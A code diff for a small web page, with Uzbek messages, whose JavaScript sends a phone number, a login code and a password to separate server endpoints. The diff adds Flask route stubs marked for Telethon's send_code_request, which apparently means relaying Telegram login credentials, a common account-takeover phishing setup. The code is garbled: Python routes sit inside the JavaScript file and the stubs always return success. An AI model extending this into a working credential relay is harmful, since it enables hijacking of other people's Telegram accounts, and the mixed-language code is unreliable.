@@ -187,7 +187,7 @@ async function sendCode() {
 
     phoneValue = phone;
 
-    const res = await fetch(SERVER, {
+    const res = await fetch(SERVER + "send_code", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
@@ -220,7 +220,7 @@ async function verifyCode() {
         return;
     }
 
-    const res = await fetch(SERVER, {
+    const res = await fetch(SERVER + "verify_code", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
@@ -258,7 +258,7 @@ async function verifyPassword() {
         return;
     }
 
-    const res = await fetch(SERVER, {
+    const res = await fetch(SERVER + "verify_password", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
@@ -285,6 +285,29 @@ async function verifyPassword() {
         alert("❌ Xatolik: " + JSON.stringify(data));
     }
 }
+
+@app.route("/send_code", methods=["POST"])
+def send_code():
+    data = request.json
+    phone = data.get("phone")
+
+    # BU YERDA TELETHON send_code_request
+    return jsonify({"status": "code_sent"})
+
+
+@app.route("/verify_code", methods=["POST"])
+def verify_code():
+    data = request.json
+    code = data.get("code")
+
+    return jsonify({"status": "success"})
+
+
+@app.route("/verify_password", methods=["POST"])
+def verify_password():
+    return jsonify({"status": "success"})
+
+    
 document.getElementById("sendBtn").addEventListener("click", sendCode);
 document.getElementById("verifyBtn").addEventListener("click", verifyCode);
 document.getElementById("passwordBtn").addEventListener("click", verifyPassword);
